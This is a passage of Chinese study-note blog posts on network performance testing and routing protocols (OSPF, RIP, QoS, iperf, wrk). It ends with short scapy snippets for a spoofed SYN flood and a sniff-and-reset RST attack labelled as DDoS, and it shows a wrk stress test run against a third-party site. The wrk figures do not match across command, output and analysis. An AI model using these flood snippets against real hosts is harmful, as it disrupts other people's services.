<li>进行OSPF点到点链路形成全邻接状态的实验可以参考RFC4063</li>
</ul>
</li>
</ul>
<ol>
<li>协议指标是路由指标的基础</li>
<li>为了测试传输、泛洪等不属于处理一条LSA时间的额外时间，仪表仿真的OSPF路由器需要向DUT下发一个已经存在于DUT的LSDB中的重复LSA，观察这个LSA下发与收到LSAck的时间差(处理重复LSA的时间dupLSAprocTime)，由于对重复LSA不会又对LSA的处理，因此该事件即为处理一条LSA时间无关的那些用于LSA发送和LSAck传输的额外时间</li>
<li>先测试传输，泛洪等其他额外时间，需要下发一个重复LSA，观察下发与收到LSAck的时间差，该事件为用于发送与Ack的传输等的额外时间，然后发布第二次重复LSA，获取与LSAck的时间差，此时获取到的为全部SPF时间，用该全部SPF时间减去传输额外时间即为SPF算法运行的时间</li>
</ol>
<h1 id="第五章-第4-7层网络性能测试"><a href="#第五章-第4-7层网络性能测试" class="headerlink" title="第五章 第4~7层网络性能测试"></a>第五章 第4~7层网络性能测试</h1><aside>
😶 第4~7层测试应采用3种模式：服务器系统模式、网络设备模式、网络系统模式

</aside>

<h2 id="TCP层面指标"><a href="#TCP层面指标" class="headerlink" title="TCP层面指标"></a>TCP层面指标</h2><aside>
⚠️ 决定传输质量

</aside>

<ul>
<li>最大TCP连接建立速率</li>
</ul>
<p>最大TCP连接建立速率是指被测设备或被测系统能够成功处理请求连接的前提下，在单位时间内所能承受的最大TCP连接建立数目，用connections/sec 表示，这一指标通常被称为最大TCP新建速率。它主要反映了被测设备的CPU使用情况以及对连接的处理速度。</p>
<ul>
<li>最大TCP连接拆除速率</li>
</ul>
<p>并发TCP连接容量：并发连接是指多个主机或用户同时连接到一个主机或设备进行数据传输，并发TCP连接容量是指被测设备能够同时成功处理的最大TCP连接数目，它反映出被测设备对多个连接的访问控制能力和连接状态跟踪能力。</p>
<h2 id="最大TCP连接建立速率测试方法"><a href="#最大TCP连接建立速率测试方法" class="headerlink" title="最大TCP连接建立速率测试方法"></a>最大TCP连接建立速率测试方法</h2><h3 id="测试目的"><a href="#测试目的" class="headerlink" title="测试目的"></a>测试目的</h3><p>被测设备的CPU使用情况以及对连接的处理速度。</p>
<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><p>使用二分搜索法</p>
<h2 id="并发TCP连接容量测试方法"><a href="#并发TCP连接容量测试方法" class="headerlink" title="并发TCP连接容量测试方法"></a>并发TCP连接容量测试方法</h2><h3 id="测试目的-1"><a href="#测试目的-1" class="headerlink" title="测试目的"></a>测试目的</h3><p>为了检验被测设备或被测系统内存性能及其连接状态表能同时容纳的最大连接数目。</p>
<h3 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h3><p>使用二分搜索法来确定最大并发TCP连接容量。首先。。。如果（pg115）</p>
<h3 id="采用协议"><a href="#采用协议" class="headerlink" title="采用协议"></a>采用协议</h3><p>HTTP1.1或以上版本 </p>
<p><strong>原因</strong>：</p>
<ol>
<li>HTTP报文通常较小，对带宽的占用较少，</li>
<li>HTTP1.1或以上版本具有默认维持TCP链接的特性，在次特性下才能检测到被检设备所支持的并发TCP连接容量的最大值。</li>
</ol>
<h1 id="第五章-习题"><a href="#第五章-习题" class="headerlink" title="第五章 习题"></a>第五章 习题</h1><ul>
<li>选择题<ul>
<li>第4~7层网络测试关注的重点是面向用户的网络应用部署是否合理</li>
<li>TCP和HTTP 是 4~7层 测试中常用的主要协议</li>
<li>RFC3511 提供了4~7层网络的相关测试方法学</li>
<li>传输层的UDP协议用于网络应用中的非实时业务</li>
<li>并发TCP连接容量，最大TCP连接建立速率和最大TCP连接拆除速率 都是4~7层网络测试主要关注的</li>
<li>突发流量处理，最大同步用户数，最大事务处理速率 是第4~7层网络测试中所关注的HTTP层面上的3个关键指标</li>
</ul>
</li>
</ul>
<ol>
<li>关闭TCP连接方式：三次握手关闭 ，四次握手关闭<br>基本过程：FIN with SEQ → ACK → FIN with SEQ → Ack<br>简化过程：FIN Ack → FIN Ack → ACK</li>
<li>采用哪几种模式对系统进行全方位测试评估：服务器系统模式，网络设备模式，网络系统模式</li>
<li>最大TCP连接建立速率测试期望曲线和当前曲线基本吻合说明了DUT最大连接建立速率已经接近该值</li>
</ol>
<h1 id="第六章-网络安全性能测试"><a href="#第六章-网络安全性能测试" class="headerlink" title="第六章 网络安全性能测试"></a>第六章 网络安全性能测试</h1><h2 id="网络安全的基本概念"><a href="#网络安全的基本概念" class="headerlink" title="网络安全的基本概念"></a>网络安全的基本概念</h2><p>计算机网络安全是指利用各种技术和管理措施，确保网络系统正常运行，从而保证网络数据的可用性、完整性、保密性。</p>
<h2 id="网络入侵"><a href="#网络入侵" class="headerlink" title="网络入侵"></a>网络入侵</h2><p>又称为网络攻击，一般分为网络存取攻击和资源消耗攻击。</p>
<h2 id="网络存取攻击"><a href="#网络存取攻击" class="headerlink" title="网络存取攻击"></a>网络存取攻击</h2><p>通过非法途径获得网络中的资源使用权限或者利用网络从事非法攻击活动，如非法侵入企业内部网络获取商业机密信息等</p>
<h2 id="资源消耗攻击"><a href="#资源消耗攻击" class="headerlink" title="资源消耗攻击"></a>资源消耗攻击</h2><p>攻击者通过某种手段扰乱或者阻止网络系统为用户提供正常服务，如通过DoS攻击方式致使Web服务器瘫痪等</p>
<h2 id="常见的分布式拒绝服务攻击："><a href="#常见的分布式拒绝服务攻击：" class="headerlink" title="常见的分布式拒绝服务攻击："></a>常见的分布式拒绝服务攻击：</h2><p>SYN Flood攻击、Land-based 攻击、Reset Flood攻击、ARP Flood攻击</p>
<h1 id="第七章-网络服务质量测试"><a href="#第七章-网络服务质量测试" class="headerlink" title="第七章 网络服务质量测试"></a>第七章 网络服务质量测试</h1><h2 id="QoS-Quality-of-Service-服务质量🤏🏽"><a href="#QoS-Quality-of-Service-服务质量🤏🏽" class="headerlink" title="QoS(Quality of Service) 服务质量🤏🏽"></a>QoS(Quality of Service) 服务质量🤏🏽</h2><p>定义为网络在传输数据流时要求满足的一系列服务请求，具体可以量化为带宽、时延、时延抖动、吞吐量和丢包率等性能指标。强调传输服务在端到端（end-to-end）或者网络边界到网络边界范围的整体性。服务质量的最终目的就是为各种业务提供可靠的端到端的服务质量保证</p>
<ul>
<li>能够保障要求：<strong>保障服务</strong></li>
<li>能够预测但是不能保障：<strong>预测服务</strong></li>
<li>不完全保障但可达部分服务：<strong>尽力服务</strong></li>
</ul>
<h2 id="节点功能"><a href="#节点功能" class="headerlink" title="节点功能"></a>节点功能</h2><aside>
🚧 节点可能只有部分功能，具体情况由SLA决定

</aside>

<ol>
<li>按照不同业务等级协定SLA提供不同服务</li>
<li>能够满足高优先级业务的资源需求，可以网络资源预约(资源预留)，或拥有相应的资源调度算法</li>
<li>尽量保证高优先级服务不发生丢弃，满足其时延，抖动要求，各个节点有合理的排队算法和队列管理调度算法</li>
</ol>
<h2 id="端到端QoS保证"><a href="#端到端QoS保证" class="headerlink" title="端到端QoS保证"></a>端到端QoS保证</h2><blockquote>
<p>端到端通信：源主机进程到目的主机进程之间的通信</p>
</blockquote>
<p>从结构出发，逐层保证</p>
<h3 id="TCP-IP-结构"><a href="#TCP-IP-结构" class="headerlink" title="TCP/IP 结构"></a>TCP/IP 结构</h3><ul>
<li>802.1P协议头包括一个<strong>三位优先级字段</strong></li>
<li>网络层：IP数据包首部的<strong>TOS</strong>，用于标注优先级</li>
<li>传输层：<strong>端口号</strong>作为传输层提供给应用层的访问点</li>
</ul>
<h2 id="QoS模型"><a href="#QoS模型" class="headerlink" title="QoS模型"></a>QoS模型</h2><ul>
<li>尽力而为服务：无QoS</li>
<li>综合服务模型：信令化/动态QoS</li>
<li>区分服务(DiffServ)模型：预先部署QoS</li>
<li>Diff-IntServ综合模型</li>
</ul>
<h3 id="服务类型🦴"><a href="#服务类型🦴" class="headerlink" title="服务类型🦴"></a>服务类型🦴</h3><ul>
<li>有保证服务(GS)</li>
<li>负载可控服务(CLS)</li>
<li>尽力而为服务(BS)</li>
</ul>
<h2 id="分组分类"><a href="#分组分类" class="headerlink" title="分组分类"></a>分组分类</h2><h3 id="五元组："><a href="#五元组：" class="headerlink" title="五元组："></a>五元组：</h3><p>源/目的IP,源/目的端口,协议类型</p>
<p><strong>原则</strong>：考虑分类粒度和处理开销之间的平衡</p>
<blockquote>
<p>用于分类的字段越多，处理开销越大</p>
</blockquote>
<h2 id="Qos测试"><a href="#Qos测试" class="headerlink" title="Qos测试"></a>Qos测试</h2><aside>
⚠️ 顶层测试：端口测试           底层测试：网元测试

</aside>

<p>$jitter = |(R_xA-T_xA)-(R_xB-T_xB)|$</p>
<p>$R_xA$表示包A的接收时间</p>
<p>$T_xA$表示包A的发送时间</p>
<h2 id="逐跳行为PHB"><a href="#逐跳行为PHB" class="headerlink" title="逐跳行为PHB"></a>逐跳行为PHB</h2><p>根据服务等级协议SLA进行设置，不同PHB有不同的限制，因此需要不同的转发行为</p>
<p>主动队列管理是当前队列管理的热点 WRED算法是当前使用最为广泛的主动队列管理算法</p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="ensp中运用两个路由进行nqa测试-抖动-时延"><a href="#ensp中运用两个路由进行nqa测试-抖动-时延" class="headerlink" title="ensp中运用两个路由进行nqa测试 抖动/时延"></a><strong>ensp中运用两个路由进行nqa测试 抖动/时延</strong></h2><blockquote>
<p>网络质量分析</p>
</blockquote>
<h3 id="绘制网络拓扑图，连通路由"><a href="#绘制网络拓扑图，连通路由" class="headerlink" title="绘制网络拓扑图，连通路由"></a>绘制网络拓扑图，连通路由</h3><h3 id="R1中建立NQA测试实例"><a href="#R1中建立NQA测试实例" class="headerlink" title="R1中建立NQA测试实例"></a>R1中建立NQA测试实例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">naq test-instance Elimos lessonwork</span><br><span class="line"></span><br><span class="line">test-type icmp</span><br><span class="line"></span><br><span class="line">destination-address ipv4 1.1.1.1</span><br><span class="line"></span><br><span class="line">frequency 100 <span class="comment"># 配置测试频率位100ms</span></span><br><span class="line"></span><br><span class="line">start now</span><br></pre></td></tr></table></figure>

<h3 id="查看测试结果"><a href="#查看测试结果" class="headerlink" title="查看测试结果"></a>查看测试结果</h3><p> <code>display nqa result lessonwork Elimos 1</code></p>
<h2 id="iperf：udp-tcp带宽测试"><a href="#iperf：udp-tcp带宽测试" class="headerlink" title="iperf：udp/tcp带宽测试"></a><strong>iperf：udp/tcp带宽测试</strong></h2><h3 id="带宽测试"><a href="#带宽测试" class="headerlink" title="带宽测试"></a>带宽测试</h3><ol>
<li>DUTS 分别连接在路由器的两个端口上，配置路由器使DUTS互通</li>
<li>首先配置好DUT:服务器端和客户端，进行iperf软件安装,通常使用</li>
</ol>
<p><code>sudo apt-get install iperf</code>进行安装</p>
<ol>
<li>服务器端运行 <code>iperf -s</code></li>
<li>客户端进行TCP测试<code>iperf -c $serverip -b 2000M -t 1200 -i 1</code></li>
<li>客户端进行UDP测试<code>iperf -c -u $serverip -b 2000M -t 1200 -i 1</code></li>
<li>输出测试结果</li>
</ol>
<ul>
<li>参数解析</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-s      <span class="comment"># 以server模式启动，iperf -s</span></span><br><span class="line">-c host <span class="comment"># 以client模式启动，host是server端</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通用参数：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-f <span class="comment"># [kmKM] 分别表示以Kbits, Mbits, KBytes, MBytes显示报告，默认以Mbits为单位,</span></span><br><span class="line">-i <span class="comment"># sec 以秒为单位显示报告间隔</span></span><br><span class="line">-l <span class="comment"># 缓冲区大小，默认是8KB,</span></span><br><span class="line">-m <span class="comment"># 显示tcp最大mtu值</span></span><br><span class="line">-o <span class="comment"># 将报告和错误信息输出到文件</span></span><br><span class="line">-p <span class="comment"># 指定服务器端使用的端口或客户端所连接的端口</span></span><br><span class="line">-u <span class="comment"># 使用udp协议</span></span><br><span class="line">-w <span class="comment"># 指定TCP窗口大小，默认是8KB</span></span><br><span class="line">-B <span class="comment"># 绑定一个主机地址或接口（当主机有多个地址或接口时使用该参数）</span></span><br><span class="line">-C <span class="comment"># 兼容旧版本（当server端和client端版本不一样时使用）</span></span><br><span class="line">-M <span class="comment"># 设定TCP数据包的最大mtu值</span></span><br><span class="line">-N <span class="comment"># 设定TCP不延时</span></span><br><span class="line">-V <span class="comment"># 传输ipv6数据包</span></span><br></pre></td></tr></table></figure>

<ul>
<li>server专用参数</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-D <span class="comment">#  以服务方式运行。</span></span><br><span class="line">-R <span class="comment"># 停止iperf服务。针对-D</span></span><br></pre></td></tr></table></figure>

<ul>
<li>client端专用参数</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-d <span class="comment"># 同时进行双向传输测试</span></span><br><span class="line">-n <span class="comment"># 指定传输的字节数，</span></span><br><span class="line">-r <span class="comment"># 单独进行双向传输测试</span></span><br><span class="line">-t <span class="comment"># 测试时间，默认20秒,</span></span><br><span class="line">-F <span class="comment"># 指定需要传输的文件</span></span><br><span class="line">-T <span class="comment"># 指定ttl值</span></span><br></pre></td></tr></table></figure>

<h2 id="分析基于http测试工具WRK进行网站压力测试结果"><a href="#分析基于http测试工具WRK进行网站压力测试结果" class="headerlink" title="分析基于http测试工具WRK进行网站压力测试结果"></a><strong>分析基于</strong>http测试工具WRK<strong>进行网站压力测试结果</strong></h2><blockquote>
<p>压力测试</p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote>
<p>Debian</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install wrk</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Others</p>
</blockquote>
<p><a href="https://pkgs.org/download/wrk">Wrk Download (APK, DEB, RPM, XBPS, ZST)</a></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>验证安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">elimos@pixel:~$ wrk -v</span><br><span class="line">wrk debian/4.1.0-3 [epoll] Copyright (C) 2012 Will Glozer</span><br><span class="line">Usage: wrk &lt;options&gt; &lt;url&gt;                            </span><br><span class="line">  Options:                                            </span><br><span class="line">    -c, --connections &lt;N&gt;  Connections to keep open   </span><br><span class="line">    -d, --duration    &lt;T&gt;  Duration of <span class="built_in">test</span>           </span><br><span class="line">    -t, --threads     &lt;N&gt;  Number of threads to use   </span><br><span class="line">                                                      </span><br><span class="line">    -s, --script      &lt;S&gt;  Load Lua script file       </span><br><span class="line">    -H, --header      &lt;H&gt;  Add header to request      </span><br><span class="line">        --latency          Print latency statistics   </span><br><span class="line">        --<span class="built_in">timeout</span>     &lt;T&gt;  Socket/request <span class="built_in">timeout</span>     </span><br><span class="line">    -v, --version          Print version details      </span><br><span class="line">                                                      </span><br><span class="line">  Numeric arguments may include a SI unit (1k, 1M, 1G)</span><br><span class="line">  Time arguments may include a time unit (2s, 2m, 2h)</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><code>wrk -t 10 -d 10s -c 2000 --latency [https://baidu.com](https://baidu.com/)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试结果</span></span><br><span class="line">Running 10s <span class="built_in">test</span> @ https://baidu.com</span><br><span class="line">  10 threads and 800 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency    75.51ms   20.79ms 420.43ms   90.16%</span><br><span class="line">    Req/Sec   199.38    167.78   656.00     63.09%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%   71.54ms</span><br><span class="line">     75%   80.01ms</span><br><span class="line">     90%   91.93ms</span><br><span class="line">     99%  144.13ms</span><br><span class="line">  12012 requests <span class="keyword">in</span> 10.06s, 4.09MB <span class="built_in">read</span></span><br><span class="line">Requests/sec:   1193.73</span><br><span class="line">Transfer/sec:    416.12KB</span><br></pre></td></tr></table></figure>

<h3 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h3><ul>
<li>d <time></li>
</ul>
<blockquote>
<p>测试时间 支持s秒 m分 h时</p>
</blockquote>
<ul>
<li>t <treads></li>
</ul>
<blockquote>
<p>线程数</p>
</blockquote>
<ul>
<li>c <connections></li>
</ul>
<blockquote>
<p>连接数</p>
</blockquote>
<ul>
<li>latency</li>
</ul>
<blockquote>
<p>显示分布式相应信息</p>
</blockquote>
<h3 id="结果解析"><a href="#结果解析" class="headerlink" title="结果解析"></a>结果解析</h3><p>进行了30s的对baidu.com的压力测试，使用了12线程并发400连接，单一线程平均耗时933.14ms，最高延迟2s，在30秒内发送了发送了8181个请求，读取到了121.83MB,无套接字错误，平均请求速率是271.82/s,转发速率4.05MB/s</p>
<p>如图</p>
<p><img src="https://pic.imgdb.cn/item/62c002855be16ec74a3a6e90.png" alt="wrkimage.bmp"></p>
<ul>
<li>Tread Stats</li>
</ul>
<blockquote>
<p>线程状态</p>
</blockquote>
<ul>
<li>Avg</li>
</ul>
<blockquote>
<p>平均时间</p>
</blockquote>
<ul>
<li>stdev</li>
</ul>
<blockquote>
<p>标准差</p>
</blockquote>
<ol start="4">
<li>结果分析</li>
</ol>
<ul>
<li>Tread Stats 线程状态</li>
<li>Avg 平均时间</li>
<li>+/- stdev 标准差</li>
</ul>
<h2 id="基于scapy进行的-syn-rst-flood测试代码"><a href="#基于scapy进行的-syn-rst-flood测试代码" class="headerlink" title="基于scapy进行的 syn/rst flood测试代码"></a><strong>基于scapy进行的 syn/rst flood测试代码</strong></h2><h3 id="SYN"><a href="#SYN" class="headerlink" title="SYN"></a>SYN</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SYN : 请求同步 DDoS攻击</span></span><br><span class="line"></span><br><span class="line">sport = random.randint(<span class="number">1</span>,<span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">ip = IP(src=src,dst=dst)</span><br><span class="line"></span><br><span class="line">tcp = TCP(sport = sport ,dport = dport)</span><br><span class="line"></span><br><span class="line">SYN = ip /tcp</span><br><span class="line"></span><br><span class="line">SYN.summary()</span><br><span class="line"></span><br><span class="line">send(SYN , verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="RST-Flood"><a href="#RST-Flood" class="headerlink" title="RST Flood"></a>RST F<strong>lood</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 构建大量SYN标志位的TCP报文进行DDoS攻击</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poison</span>(<span class="params">packet</span>):</span><br><span class="line"></span><br><span class="line">packet[TCP].flags=<span class="string">&#x27;R&#x27;</span></span><br><span class="line"></span><br><span class="line">sendp(packet)</span><br><span class="line"></span><br><span class="line">sniff(<span class="built_in">filter</span>=<span class="string">&#x27;tcp&#x27;</span>,prn=poison)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NetWork</category>
      </categories>
      <tags>
        <tag>Learning</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>路由与交换</title>
    <url>/2022/07/02/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><ol>
<li>交换机与路由器的连接这是必须掌握的</li>
<li>rip的环路引起的原因、避免方案也是必须的，还有一些细节一点的比如：跳数值，报文作用等</li>
<li>ospf是重点，大体的如：算法描述和计算过程，最后一个过程里要知道涉及到哪些些数据结构里的算法。 还有报文类型，哪些报文是用来干什么的，LSA类型，每个LSA类型是用来干什么的。支持的网络类型，要知道哪些是需要选举DR BDR哪些不要，选举的好处是什么 要会比较 IP地址  路由器ID  区域ID的表示方法</li>
<li>需要知道BGP是用来干嘛的，AS内与AS间为什么会产生环路，解决环路的方法有哪些。<br>BGP的报文类型，作用，路由优选顺序(知道顺序即可)，水平分割等。</li>
<li>防火墙的分类，作用，安全区域等</li>
<li>前缀列表</li>
<li>路由策略和PBR，知道要知道他们的区别，应用范围</li>
</ol>
<span id="more"></span>

<h1 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h1><h2 id="交换机的作用"><a href="#交换机的作用" class="headerlink" title="交换机的作用"></a>交换机的作用</h2><ol>
<li>学习MAC地址</li>
<li>转发数据帧</li>
<li>连接不同网络</li>
<li>划分局域网</li>
</ol>
<h2 id="路由器的作用"><a href="#路由器的作用" class="headerlink" title="路由器的作用"></a>路由器的作用</h2><ul>
<li>路由功能：报文的路径决策、负载均衡、多媒体传输等</li>
<li>智能化网络服务：QoS、访问列表（防火墙）、验证、授权、计费、链路备份、调试和管理等</li>
</ul>
<h2 id="交换机与路由器的连接🐿️"><a href="#交换机与路由器的连接🐿️" class="headerlink" title="交换机与路由器的连接🐿️"></a>交换机与路由器的连接🐿️</h2><ul>
<li>将交换机的接口配置为access</li>
<li>将交换机的接口通过设置pvid剥离tag标</li>
<li>将交换机的接口 undo switchport ,直接配置ip地址</li>
</ul>
<p>相当于关闭交换机的二层接口，只允许使用三层接口</p>
<ul>
<li>将路由器的接口switchport ,在vlanif内配置ip地址</li>
</ul>
<p>相当于启用路由器的二层接口，需要通过vlan来配置ip</p>
<h1 id="网络地址的划分与优化"><a href="#网络地址的划分与优化" class="headerlink" title="网络地址的划分与优化"></a>网络地址的划分与优化</h1><p>每个子网内有多少个主机号等基础知识</p>
<hr>
<h1 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h1><h1 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h1><ul>
<li>典型的距离矢量路由协议,域间路由协议</li>
<li>Routing Information Protocols,路由信息协议，使用520端口，基于UDP</li>
</ul>
<h3 id="为什么只适用于小型网络？"><a href="#为什么只适用于小型网络？" class="headerlink" title="为什么只适用于小型网络？"></a>为什么只适用于小型网络？</h3><p>为了防止RIP路由在网络中被无限泛洪从而跳数累加到无穷大，RIP规定：路由的最大跳数为15跳，也就是如果度量值大于等于16跳则被视为不可达；</p>
<p>最大跳数的设定虽然解决了度量值计数到无穷大的问题，但是却也极大地限制了RIP所能支持的网络的规模</p>
<h3 id="报文类型"><a href="#报文类型" class="headerlink" title="报文类型"></a>报文类型</h3><ul>
<li>请求（Request）报文🐿️</li>
</ul>
<p>用于向直连的路由器请求全部或者部分路由信息</p>
<ul>
<li>响应（Response）报文🐿️</li>
</ul>
<p>用于发送路由更新，或对请求报文的回应，也可由路由器自主发出</p>
<h3 id="环路出现原因🤐"><a href="#环路出现原因🤐" class="headerlink" title="环路出现原因🤐"></a>环路出现原因🤐</h3><p>路由器接收到了从本地发出去的，对方路由认为可达的不可达路由，并错误认为通过对方可达</p>
<h3 id="环路的解决方案🤐"><a href="#环路的解决方案🤐" class="headerlink" title="环路的解决方案🤐"></a>环路的解决方案🤐</h3><ul>
<li><strong>定义最大度量以防止计数至无穷大</strong></li>
</ul>
<p>为了防止RIP路由在网络中被无限泛洪从而跳数累加到无穷大，RIP规定：路由的最大跳数为15跳，也就是如果度量值大于等于16跳则被视为不可达</p>
<ul>
<li><strong>水平分割</strong></li>
</ul>
<p>路由器的某个接口接收到的路由不能再从该接口通告出去</p>
<ul>
<li><strong>毒性逆转</strong></li>
</ul>
<p><strong>毒性逆转</strong>（<strong>带毒性路由的水平分割</strong>）是指RIP从某个接口学到路由后，从原接口发回邻居路由器，并将该路由的开销设置为16（即指明该路由不可达）。利用这种方式，可以清除对方路由表中的无用路由。</p>
<p><strong>毒性路由</strong>是指路由信息在路由表中失效时，先将度量值变为无穷大，而不是马上从路由表中删掉这条路由信息，再将其信息发布出去，这样相邻的路由器就得知这条路由己无效了。</p>
<ul>
<li><strong>抑制计时器</strong></li>
</ul>
<p>一条路由信息无效之后，一段时间内这条路由都处于抑制状态，即在一定时间内不再接收关于同一目的地址的路由更新</p>
<ul>
<li><strong>触发更新</strong></li>
</ul>
<p>当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不用等待更新定时器超时，从而避免产生路由环路</p>
<h2 id="RIP的计时器"><a href="#RIP的计时器" class="headerlink" title="RIP的计时器"></a>RIP的计时器</h2><ul>
<li>更新计时器： 30s，路由器周期性泛洪路由表的时间间隔</li>
<li>老化计时器：180s，一条路由信息在路由表中的最大不被更新的时间</li>
<li>垃圾回收计时器：120s，老化的路由信息在被删除前的停留时间</li>
</ul>
<h2 id="RIP网络的故障排除"><a href="#RIP网络的故障排除" class="headerlink" title="RIP网络的故障排除"></a>RIP网络的故障排除</h2><p>network :用于激活相应接口上的rip功能（或：宣告网络），由于rip的version 2能自动汇总路由，故其后必须是主类网络</p>
<p>如果接口启用水平分割、毒性逆转，则不进行汇总</p>
<p>若希望既开启水平分割或毒性逆转，又开启自动汇总，可在rip的配置视图下配置命令：</p>
<p><code>[R-rip-1]summary always</code></p>
<h1 id="OSPF"><a href="#OSPF" class="headerlink" title="OSPF"></a>OSPF</h1><ul>
<li>Open Shortest Path First，开放式最短路径优先</li>
<li>链路状态类型协议，域内路由协议</li>
<li>适用于中大型网络</li>
</ul>
<h2 id="路由计算过程🦂"><a href="#路由计算过程🦂" class="headerlink" title="路由计算过程🦂"></a>路由计算过程🦂</h2><ol>
<li>路由器之间发现并建立邻居关系</li>
<li>每台路由器产生并向邻居泛洪链路状态信息，同时接收来自其他路由器状态信息，完成LSDB（Link State Database：链路状态数据库）的同步</li>
<li>每台路由器基于LSDB通过SPF（Shortest Path First）算法，计算得到一棵以自己为根的SPT(Shortest Path Tree)，再以SPT为基础计算去往各邻居连接网络的最优路由，并形成路由表。</li>
</ol>
<h2 id="三张表💕"><a href="#三张表💕" class="headerlink" title="三张表💕"></a>三张表💕</h2><ul>
<li>邻居表（Peer table）</li>
</ul>
<p><code>display ospf peer</code><br>在路由器交互链路状态通告之前，直连路由器需要建立邻居关系。当接口激活OSPF后，该接口会周期性地发送hello报文用于发现直连链路上的邻居。当在接口上发现邻居后，邻居信息会被写入路由器的邻居表中。</p>
<ul>
<li>链路状态数据库（Link-state database，简称LSDB）</li>
</ul>
<p><code>display ospf lsdb</code><br>OSPF在网络中泛洪链路状态信息，这些信息即为LSA（Link State Advertisement，链路状态通告），用来描述网络拓扑信息。LSA被写入OSPF路由器的LSDB中。</p>
<ul>
<li>OSPF路由表（Routing table）</li>
</ul>
<p><code>display ospf routing</code><br>基于LSDB进行SPF计算得到一棵以自己为根、无环的最短路径树。基于最短路径树发现到达全网各个网段的最佳路径，并将最佳路径（即路由信息）写入得出OSPF路由表。</p>
<h2 id="OSPF报文类型"><a href="#OSPF报文类型" class="headerlink" title="OSPF报文类型"></a>OSPF报文类型</h2><ul>
<li>Hello报文</li>
</ul>
<blockquote>
<p>周期性发送，用来发现和维持OSPF邻居关系</p>
</blockquote>
<ul>
<li>DD报文 Database Description packet</li>
</ul>
<blockquote>
<p>描述本地LSDB的摘要信息，用于两台设备进行数据库同步</p>
</blockquote>
<ul>
<li>LSR报文 Link State Request packet</li>
</ul>
<blockquote>
<p>向对方请求所需的LSA,设备只有在OSPF邻居双方成功交换DD报文后才会向对方发出LSR报文</p>
</blockquote>
<ul>
<li>LSU报文 Link State Update packet</li>
</ul>
<blockquote>
<p>用于向对方发送其所需要的LSA</p>
</blockquote>
<ul>
<li>LSAck报文 Link State Acknowledgment packet</li>
</ul>
<blockquote>
<p>用来对收到的LSA进行确认</p>
</blockquote>
<h2 id="LSA-链路状态通告🧠"><a href="#LSA-链路状态通告🧠" class="headerlink" title="LSA 链路状态通告🧠"></a><strong>LSA</strong> 链路状态通告🧠</h2><h3 id="链路状态"><a href="#链路状态" class="headerlink" title="链路状态"></a>链路状态</h3><ul>
<li>init (hello报文)</li>
<li>2-way(hello报文)   （邻居关系）</li>
<li>fffexstart (DD报文)</li>
<li>exchange(DD报文)</li>
<li>loading(LSR,LSU,LSAck报文)</li>
<li>full (hello报文)      （邻接关系）</li>
</ul>
<p>设计LSA在区域里面可以减少链路资源消耗</p>
<aside>
🔥 在一个互联互通的OSPF网络里面 每一个区域里面都有12345类LSA ，但是边缘区域可以只要123类路由，只需要包含到达ABR边界路由器的路由即可

</aside>

<ul>
<li>1 Router LSA</li>
</ul>
<blockquote>
<p>每台OSPF路由器都会产生，用来描述本设备链接到该区域的直连接口状态以及COST等信息</p>
</blockquote>
<ul>
<li>2 Network LSA</li>
</ul>
<blockquote>
<p>由DR 路由器产生，用来描述在该MA 网络上DR直连的所有OSPF路由器的RouterID (包含自己)，以及该MA网络的网络掩码</p>
</blockquote>
<blockquote>
<p>没有COST字段</p>
</blockquote>
<ul>
<li>[ABR]  3 Network Summary LSA</li>
</ul>
<blockquote>
<p>归纳本区域信息汇总后交付到其他区域，用于OSPF区域间路由计算</p>
</blockquote>
<aside>
📌 以上1，2，3类已经可以完整描述OSPF网络的所有信息

</aside>

<ul>
<li>[ABR] 4 ASBR summary LSA</li>
</ul>
<blockquote>
<p>用于描述ASBR : 使用重发布来描述两个不同协议的区域</p>
</blockquote>
<blockquote>
<p>实际是主机路由，用于描述到AS边界路由器的路由</p>
</blockquote>
<blockquote>
<p>使用32位掩码（RouterID）来匹配主机路由</p>
</blockquote>
<ul>
<li>[ASBR] 5 AS External LSA</li>
</ul>
<blockquote>
<p>描述外部路由的LSA</p>
</blockquote>
<ul>
<li>[ASBR] 7 NSSA LSA</li>
</ul>
<blockquote>
<p>外部路由标志O_ASE 即 OSPF AS External</p>
</blockquote>
<blockquote>
